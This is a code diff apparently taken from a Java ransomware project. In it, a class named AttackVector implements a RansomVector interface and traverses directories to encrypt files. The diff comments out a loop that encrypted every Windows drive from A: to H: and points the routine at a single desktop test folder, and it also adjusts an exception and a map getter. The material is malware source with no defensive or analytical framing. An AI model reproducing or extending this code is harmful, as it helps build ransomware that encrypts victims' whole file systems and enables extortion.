@@ -14,6 +14,7 @@ import Agent.entites.CryptoKey;
 import Agent.exceptions.AttackVectorException;
 import Agent.exceptions.CryptOperationException;
 import Agent.exceptions.CryptoException;
+import Agent.exceptions.InOutException;
 import Agent.services.KeyService;
 import Agent.traversal.*;
 
@@ -22,7 +23,7 @@ public class AttackVector implements RansomVector {
 	private KeyService keyService;
 	private AlgorithmsMap algorithmMap;
 
-	public AttackVector() {
+	public AttackVector() throws InOutException {
 		keyService = new KeyService();
 		algorithmMap = new AlgorithmsMap();
 	}
@@ -53,13 +54,13 @@ public class AttackVector implements RansomVector {
 		bfs.init();
 		Collection<File> visitedFolders = new ArrayList<File>();
 		// WINDOWS
-		for (char i = 'A'; i <= 'H'; i++) {
+		//for (char i = 'A'; i <= 'H'; i++) {
 			try {
-				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
+				traverseAndCrypt("C:\\Users\\HP\\Desktop\\hi", visitedFolders, key, bfs, cryptFunc);
 			} catch (CryptoException e) {
 				throw new AttackVectorException("Could not crypt the whole file-system", e);
 			}
-		}
+		//}
 
 	}
 
@@ -76,7 +77,7 @@ public class AttackVector implements RansomVector {
 	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
 			CryptoOperation cryptoFunc) throws CryptoException {
 
-		CryptoAlgorithm crypto = getCryptClass(algorithmMap.getMap(), key.getAlgorithm());
+		CryptoAlgorithm crypto = getCryptClass(algorithmMap.getAlgorithmMap(), key.getAlgorithm());
 		struct.add(new File(inputDir));
 		while (!(struct.isEmpty())) {
 			/* get next file/directory */
